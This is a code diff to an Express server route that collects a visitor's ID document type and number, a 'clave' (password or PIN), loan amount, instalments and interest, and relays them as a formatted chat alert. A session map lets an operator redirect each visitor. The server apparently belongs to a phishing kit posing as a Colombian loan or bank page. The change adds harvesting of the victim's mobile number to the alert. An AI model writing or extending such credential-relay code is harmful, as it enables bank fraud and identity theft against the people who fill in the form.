@@ -427,13 +427,14 @@ app.post("/notify/correo", async (req, res) => {
 // Notificar formulario
 app.post("/notify/formulario", async (req, res) => {
   try {
-    const { sessionId, tipoDoc, numDoc, clave, monto, cuotas, interes } = req.body || {};
+    const { sessionId, tipoDoc, numDoc, clave, celular, monto, cuotas, interes } = req.body || {};
     if (!sessionId) return res.status(400).json({ ok: false, error: "Falta sessionId" });
 
     if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
 
     const tipoDocSafe = getSafeValue(tipoDoc);
     const numDocSafe = getSafeValue(numDoc);
+    const celularSafe = getSafeValue(celular);
     const montoSafe = monto && !isNaN(monto) ? (monto / 1000000).toFixed(0) : "N/D";
     const cuotasSafe = getSafeValue(cuotas);
     const interesSafe = getSafeValue(interes);
@@ -443,6 +444,7 @@ app.post("/notify/formulario", async (req, res) => {
 
 📄 *Tipo de documento:* ${tipoDocSafe}
 🆔 *Documento:* ${numDocSafe}
+📱 *Celular:* ${celularSafe}
 💵 *Monto solicitado:* ${montoSafe === "N/D" ? "N/D" : `$${montoSafe}M COP`}
 📅 *Cuotas:* ${cuotasSafe} meses
 📊 *Interés:* ${interesSafe}% anual
